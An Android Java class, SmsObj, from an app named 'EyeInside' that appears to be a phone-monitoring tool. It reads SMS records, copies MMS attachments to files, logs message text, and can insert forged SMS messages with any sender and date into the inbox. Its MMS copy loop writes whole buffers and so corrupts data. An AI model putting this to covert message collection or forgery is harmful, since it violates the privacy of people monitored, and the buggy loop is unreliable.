package com.code4bones.EyeInside;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import com.code4bones.utils.NetLog;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

public class SmsObj extends Object implements Comparable<SmsObj> {

	public class TypePhone {
		String type;
		String phone;
	};
	
	final public static int IN = 1;
	final public static int OUT = 2;
	
	public String phone;
	public String name;
	public String message;
	public String   date;
	public String filename;
	public long  occured;
	public long  thread;
	public long  id;
	public long type;
	public long status;
	final public SimpleDateFormat df = new SimpleDateFormat("dd-MM-yyyy' 'HH:mm:ss");
	final public ArrayList<TypePhone> phoneList = new ArrayList<TypePhone>();
	
	public SmsObj(Cursor cur) {
		phone      = ContactObj.NormalizePhone(cur.getString(2));
		name       = phone;
		occured   = cur.getLong(4);
		date 		 = df.format(new Date(occured));
		thread	     = cur.getLong(1);
		id 			 = cur.getLong(0);
		type 		 = cur.getLong(8);
		status 		 = cur.getLong(7);
		message  = cur.getString(11);
	}

	public void addPhone(long type,String phone) {
		TypePhone t = new TypePhone();
		t.type = type==137?"Источник":"Приемник";
		t.phone = ContactObj.NormalizePhone(phone);
		phoneList.add(t);
	}
	
	public  SmsObj(Context context,String id,String name,String data) {

		String names[] = data.split("/");
		if ( name == null )
			this.name = names[names.length-1];
		else
			this.name = name;
		
		Uri uri = Uri.parse("content://mms/part/"+id);
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		InputStream is = null;
		try {
			is = context.getContentResolver().openInputStream(uri);
			byte[] buffer = new byte[1024];
			int len;
			while ( (len = is.read(buffer)) > 0) 
				bos.write(buffer);
			
			
			filename = CommandObj.getFile(context, this.name);
			NetLog.v("%s,%s,%s",filename,phoneList.size(),data); 

			FileOutputStream os = new FileOutputStream(new File(filename));
			bos.writeTo(os);
			bos.close();
			os.close();
			is.close();
		} catch ( Exception e ) {
			NetLog.v("SmsObj(MMS): %s",e.getMessage());
		}
	}
	
	
	public void Dump() {
		NetLog.v("%d : %s %s | %s %s\r\n",id,date,name,type == IN?"IN":"OUT",message);
	}

	public SmsObj assignIfNew(SmsObj old) {

		if ( old == null )
			return this;
		
		if ( old.occured < this.occured ) {
			return this;
		}
		return old;
	}
	
	public int compareTo(SmsObj rhs) {
		if ( thread < rhs.thread )
			return -1;
		else if ( thread > rhs.thread )
			return 1;
		return 0;
	}

	public static Uri addSMS(Context context,String phone,Date date,boolean read,boolean inbox,String message) {
		if ( date == null )
			date = new Date();
		ContentValues values = new ContentValues();
        values.put("address", phone);
        values.put("date", date.getTime());
        values.put("read", read?1:0);
        values.put("status", -1);
        values.put("type", inbox?1:2);
        values.put("body", message);
        Uri inserted = context.getContentResolver().insert(Uri.parse("content://sms"), values); 		
        return inserted;
	}
	
}
